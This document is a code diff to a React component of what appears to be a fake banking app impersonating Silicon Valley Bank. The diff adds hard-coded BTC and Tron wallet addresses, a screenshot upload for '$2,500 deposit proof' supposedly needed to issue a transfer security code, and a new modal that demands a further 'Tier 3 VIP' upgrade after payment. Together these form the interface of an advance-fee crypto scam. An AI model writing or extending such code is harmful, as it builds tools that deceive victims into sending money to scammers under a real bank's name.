@@ -27,9 +27,10 @@ import {
 interface SendPanelProps {
   user: User;
   onSuccess: (updatedUser: User, transaction: Transaction) => void;
+  onNavigateTab?: (tab: string) => void;
 }
 
-export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess }) => {
+export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess, onNavigateTab }) => {
   // Transfer Form State
   const [selectedCountry, setSelectedCountry] = useState('United States');
   const [selectedBank, setSelectedBank] = useState('Silicon Valley Bank (SVB)');
@@ -55,15 +56,18 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess }) => {
   // Deposit $2,500 USD activation requirement modal state
   const [showDepositPromptModal, setShowDepositPromptModal] = useState(false);
   const [showCryptoModal, setShowCryptoModal] = useState(false);
-  const [cryptoMethod, setCryptoMethod] = useState<'BTC' | 'USDT'>('BTC');
+  const [showTier3PromptModal, setShowTier3PromptModal] = useState(false);
+  const [cryptoMethod, setCryptoMethod] = useState<'BTC' | 'TRX' | 'USDT'>('BTC');
   const [txHash, setTxHash] = useState('');
   const [proofNote, setProofNote] = useState('');
+  const [proofImage, setProofImage] = useState<string | null>(null);
   const [submittingDeposit, setSubmittingDeposit] = useState(false);
   const [depositSuccessMsg, setDepositSuccessMsg] = useState<string | null>(null);
   const [copiedAddress, setCopiedAddress] = useState(false);
 
-  const [walletAddresses, setWalletAddresses] = useState<{ BTC: string; USDT: string }>({
+  const [walletAddresses, setWalletAddresses] = useState<{ BTC: string; TRX: string; USDT: string }>({
     BTC: 'bc1q9v8h9svb3x0k49z82lq09fw2zxl184p24a8svb',
+    TRX: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
     USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
   });
 
@@ -124,9 +128,25 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess }) => {
   };
 
   const copyAddress = (address: string) => {
+    if (!address) return;
     navigator.clipboard.writeText(address);
     setCopiedAddress(true);
     setTimeout(() => setCopiedAddress(false), 2000);
+  };
+
+  const handleScreenshotUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (file) {
+      if (file.size > 5 * 1024 * 1024) {
+        alert('Screenshot proof file size exceeds 5MB limit.');
+        return;
+      }
+      const reader = new FileReader();
+      reader.onloadend = () => {
+        setProofImage(reader.result as string);
+      };
+      reader.readAsDataURL(file);
+    }
   };
 
   const [showVerificationModal, setShowVerificationModal] = useState(false);
@@ -175,6 +195,13 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess }) => {
       return;
     }
 
+    // Check Tier 3 Verification status
+    if (user.role !== 'admin' && user.verificationTier !== 'Tier 3') {
+      setShowVerificationModal(false);
+      setShowTier3PromptModal(true);
+      return;
+    }
+
     const numAmount = parseFloat(amount);
 
     try {
@@ -201,7 +228,12 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess }) => {
       setReference('');
       setIsValidated(false);
     } catch (err: any) {
-      setVerificationError(err.message || 'Transfer request failed. Please check the transaction details.');
+      if (err.message && err.message.includes('TIER_3_UPGRADE_REQUIRED')) {
+        setShowVerificationModal(false);
+        setShowTier3PromptModal(true);
+      } else {
+        setVerificationError(err.message || 'Transfer request failed. Please check the transaction details.');
+      }
     } finally {
       setLoading(false);
     }
@@ -213,17 +245,22 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess }) => {
     setSubmittingDeposit(true);
 
     try {
-      await api.submitCryptoActivationDeposit({
+      const res = await api.submitCryptoActivationDeposit({
         cryptoMethod,
         txHash: txHash.trim(),
-        proofNote: proofNote.trim()
+        proofNote: proofNote.trim(),
+        proofImage: proofImage || undefined
       });
+      if (res.user && onSuccess) {
+        onSuccess(res.user, null as any);
+      }
       setDepositSuccessMsg(`Your $2,500 ${cryptoMethod} deposit proof has been submitted to SVB Compliance for verification.`);
       setTimeout(() => {
         setShowCryptoModal(false);
         setDepositSuccessMsg(null);
         setTxHash('');
         setProofNote('');
+        setProofImage(null);
       }, 3000);
     } catch (err: any) {
       setError(err.message || 'Failed to submit activation deposit proof.');
@@ -666,16 +703,35 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess }) => {
             </div>
 
             <div className="text-center space-y-2">
-              <h3 className="text-lg font-bold text-white">4-Digit Outgoing Security Code Required</h3>
+              <h3 className="text-lg font-bold text-white">$2,500 Deposit Required for 4-Digit Code</h3>
               <p className="text-xs text-slate-300 leading-relaxed">
-                You must activate your 4-digit outgoing security code before you can complete a transfer. Deposit <span className="font-bold text-amber-400">$2,500 USD</span> via Bitcoin (BTC) or Tether (USDT) to issue your authorized transfer security code.
+                To generate your bank 4-digit transfer security code, a <span className="font-bold text-amber-400">$2,500 USD</span> deposit is required.
               </p>
             </div>
 
-            <div className="p-3.5 bg-amber-500/10 border border-amber-500/30 rounded-2xl text-[11px] text-amber-300 space-y-1">
-              <p className="font-semibold">Compliance Authorization Notice:</p>
-              <p className="text-slate-400">Once your $2,500 USD deposit is verified by Silicon Valley Bank compliance, your 4-digit outgoing security code will be generated automatically and credited to your balance.</p>
-            </div>
+            {user.pendingCryptoDeposit?.status === 'Pending' ? (
+              <div className="p-4 bg-amber-500/10 border border-amber-500/30 rounded-2xl text-xs space-y-2">
+                <div className="flex items-center justify-between">
+                  <span className="font-bold text-amber-400 flex items-center gap-1.5">
+                    <Clock className="w-4 h-4 animate-spin text-amber-400" />
+                    Pending 4-Digit Code
+                  </span>
+                  <span className="text-[10px] bg-amber-500/20 text-amber-300 px-2 py-0.5 rounded-full font-mono font-bold">
+                    Under Review
+                  </span>
+                </div>
+                <p className="text-slate-300 text-[11px] leading-relaxed">
+                  Your screenshot proof for <span className="font-bold">{user.pendingCryptoDeposit.cryptoMethod}</span> is being reviewed by Silicon Valley Bank compliance. Your 4-digit code will be generated upon approval.
+                </p>
+              </div>
+            ) : (
+              <div className="p-3.5 bg-slate-950 border border-slate-800 rounded-2xl text-[11px] text-slate-300 space-y-1">
+                <p className="font-semibold text-amber-400">Compliance Authorization Notice:</p>
+                <p className="text-slate-400 leading-relaxed">
+                  Once your $2,500 deposit is verified by bank compliance, your 4-digit security code will be automatically released and $2,500 will be credited to your account balance.
+                </p>
+              </div>
+            )}
 
             <div className="flex flex-col gap-2 pt-2">
               <button
@@ -686,14 +742,14 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess }) => {
                 className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3.5 rounded-2xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
               >
                 <DollarSign className="w-4 h-4" />
-                Activate Outgoing Security Code ($2,500 Deposit)
+                {user.pendingCryptoDeposit?.status === 'Pending' ? 'Update Payment Proof ($2,500 Deposit)' : 'Proceed to $2,500 Payment Method'}
               </button>
 
               <button
                 onClick={() => setShowDepositPromptModal(false)}
                 className="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold py-2.5 rounded-2xl text-xs transition-colors"
               >
-                Cancel
+                Close
               </button>
             </div>
           </div>
@@ -716,8 +772,8 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess }) => {
                 <Key className="w-5 h-5" />
               </div>
               <div>
-                <h3 className="text-base font-bold text-white">Deposit $2,500 USD</h3>
-                <p className="text-xs text-slate-400">Silicon Valley Bank Compliance Code Issuance</p>
+                <h3 className="text-base font-bold text-white">$2,500 Deposit Payment Addresses</h3>
+                <p className="text-xs text-slate-400">4-Digit Transfer Security Code Issuance</p>
               </div>
             </div>
 
@@ -730,7 +786,7 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess }) => {
 
             <form onSubmit={handleCryptoDepositSubmit} className="space-y-4 text-xs">
               <div>
-                <label className="block font-semibold text-slate-300 mb-2">Select Cryptocurrency Payment Method</label>
+                <label className="block font-semibold text-slate-300 mb-2">Select Payment Method</label>
                 <div className="grid grid-cols-2 gap-3">
                   <button
                     type="button"
@@ -743,12 +799,12 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess }) => {
                   </button>
                   <button
                     type="button"
-                    onClick={() => setCryptoMethod('USDT')}
+                    onClick={() => setCryptoMethod('TRX')}
                     className={`p-3 rounded-2xl border font-bold flex items-center justify-center gap-2 transition-all ${
-                      cryptoMethod === 'USDT' ? 'bg-amber-500 text-slate-950 border-amber-400 shadow-md' : 'bg-slate-950 text-slate-300 border-slate-800 hover:border-slate-700'
+                      cryptoMethod === 'TRX' ? 'bg-amber-500 text-slate-950 border-amber-400 shadow-md' : 'bg-slate-950 text-slate-300 border-slate-800 hover:border-slate-700'
                     }`}
                   >
-                    Tether (USDT)
+                    Tron (TRX)
                   </button>
                 </div>
               </div>
@@ -759,30 +815,55 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess }) => {
                   <span className="font-bold text-amber-400 text-sm">$2,500.00 USD</span>
                 </div>
                 <div className="text-[11px]">
-                  <span className="text-slate-400 block mb-1">Official Treasury Wallet Address ({cryptoMethod}):</span>
-                  <div className="flex items-center gap-2 bg-slate-900 p-2.5 rounded-xl border border-slate-800">
+                  <span className="text-slate-400 block mb-1">Official Wallet Address ({cryptoMethod}) — Click/Tap to Copy:</span>
+                  <div
+                    onClick={() => copyAddress(walletAddresses[cryptoMethod] || walletAddresses['TRX'] || walletAddresses['BTC'])}
+                    className="cursor-pointer hover:border-amber-500/50 flex items-center gap-2 bg-slate-900 p-3 rounded-xl border border-slate-800 transition-all group"
+                  >
                     <span className="font-mono text-amber-400 font-semibold text-xs break-all flex-1 select-all">
-                      {walletAddresses[cryptoMethod]}
+                      {walletAddresses[cryptoMethod] || walletAddresses['TRX'] || walletAddresses['BTC']}
                     </span>
-                    <button
-                      type="button"
-                      onClick={() => copyAddress(walletAddresses[cryptoMethod])}
-                      className="p-1.5 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg shrink-0 flex items-center gap-1 text-[10px] font-bold"
-                    >
+                    <div className="p-1.5 bg-slate-800 group-hover:bg-amber-500 group-hover:text-slate-950 text-slate-200 rounded-lg shrink-0 flex items-center gap-1 text-[10px] font-bold transition-all">
                       {copiedAddress ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
-                      <span>{copiedAddress ? 'Copied' : 'Copy'}</span>
-                    </button>
+                      <span>{copiedAddress ? 'Copied!' : 'Copy'}</span>
+                    </div>
                   </div>
                 </div>
               </div>
 
               <div>
-                <label className="block font-semibold text-slate-300 mb-1">Transaction Hash / Tx Proof (Optional)</label>
+                <label className="block font-semibold text-slate-300 mb-1">Upload Screenshot Proof of Payment *</label>
+                <div className="relative border-2 border-dashed border-slate-800 hover:border-amber-500/50 rounded-2xl p-4 text-center bg-slate-950 transition-all cursor-pointer">
+                  <input
+                    type="file"
+                    accept="image/*"
+                    onChange={handleScreenshotUpload}
+                    className="absolute inset-0 opacity-0 cursor-pointer w-full h-full"
+                  />
+                  {proofImage ? (
+                    <div className="space-y-2">
+                      <img src={proofImage} alt="Payment Proof" className="max-h-32 mx-auto rounded-xl border border-slate-700 object-cover" />
+                      <p className="text-emerald-400 text-[11px] font-semibold flex items-center justify-center gap-1">
+                        <CheckCircle2 className="w-3.5 h-3.5" /> Screenshot Loaded Successfully (Click to Change)
+                      </p>
+                    </div>
+                  ) : (
+                    <div className="space-y-1 text-slate-400">
+                      <FileText className="w-6 h-6 mx-auto text-amber-400" />
+                      <p className="text-xs font-semibold text-slate-200">Tap or click to select payment screenshot</p>
+                      <p className="text-[10px] text-slate-500">PNG, JPG, or WEBP up to 5MB</p>
+                    </div>
+                  )}
+                </div>
+              </div>
+
+              <div>
+                <label className="block font-semibold text-slate-300 mb-1">Transaction Hash / Reference (Optional)</label>
                 <input
                   type="text"
                   value={txHash}
                   onChange={(e) => setTxHash(e.target.value)}
-                  placeholder="e.g. 0x8f4b..."
+                  placeholder="e.g. 0x8f4b... or TXID"
                   className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-white font-mono outline-none focus:border-amber-500"
                 />
               </div>
@@ -793,7 +874,7 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess }) => {
                   type="text"
                   value={proofNote}
                   onChange={(e) => setProofNote(e.target.value)}
-                  placeholder="e.g. Transferred from Binance wallet"
+                  placeholder="e.g. Sent from personal wallet"
                   className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-white outline-none focus:border-amber-500"
                 />
               </div>
@@ -801,11 +882,65 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess }) => {
               <button
                 type="submit"
                 disabled={submittingDeposit}
-                className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3 rounded-xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
+                className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3.5 rounded-xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
               >
-                {submittingDeposit ? 'Submitting Deposit...' : 'Submit $2,500 USD Deposit Proof'}
+                {submittingDeposit ? 'Submitting Deposit...' : 'Submit $2,500 Payment Proof for Admin Review'}
               </button>
             </form>
+          </div>
+        </div>
+      )}
+
+      {/* Requirement 5 Modal: Tier 3 Upgrade Prompt when user tries to execute transfer with code */}
+      {showTier3PromptModal && (
+        <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4">
+          <div className="bg-slate-900 border border-amber-500/40 rounded-3xl p-6 max-w-md w-full space-y-5 shadow-2xl relative animate-fadeIn text-center">
+            <button
+              onClick={() => setShowTier3PromptModal(false)}
+              className="absolute top-4 right-4 text-slate-400 hover:text-white p-1 rounded-xl bg-slate-800"
+            >
+              <X className="w-5 h-5" />
+            </button>
+
+            <div className="w-14 h-14 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mx-auto">
+              <ShieldAlert className="w-7 h-7" />
+            </div>
+
+            <div className="space-y-2">
+              <h3 className="text-lg font-bold text-white">Tier 3 VIP Upgrade Required</h3>
+              <p className="text-xs text-slate-300 leading-relaxed">
+                Your 4-Digit Security Code is active. However, to complete outgoing wire transfers and bill payments using your code, your account must be upgraded to <span className="font-bold text-amber-400">Tier 3 VIP Verification Status</span>.
+              </p>
+            </div>
+
+            <div className="p-3.5 bg-slate-950 border border-slate-800 rounded-2xl text-[11px] text-slate-400 text-left space-y-1">
+              <p className="font-semibold text-amber-400">Tier 3 VIP Account Capabilities:</p>
+              <ul className="list-disc list-inside space-y-0.5 text-[11px]">
+                <li>Unlimited international wire transfers</li>
+                <li>Instant 4-digit code authorization</li>
+                <li>Priority 24/7 Treasury support</li>
+              </ul>
+            </div>
+
+            <div className="flex flex-col gap-2 pt-2">
+              <button
+                onClick={() => {
+                  setShowTier3PromptModal(false);
+                  if (onNavigateTab) onNavigateTab('profile');
+                }}
+                className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3.5 rounded-2xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
+              >
+                <UserCheck className="w-4 h-4" />
+                Upgrade to Tier 3 VIP Status
+              </button>
+
+              <button
+                onClick={() => setShowTier3PromptModal(false)}
+                className="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold py-2.5 rounded-2xl text-xs transition-colors"
+              >
+                Close
+              </button>
+            </div>
           </div>
         </div>
       )}
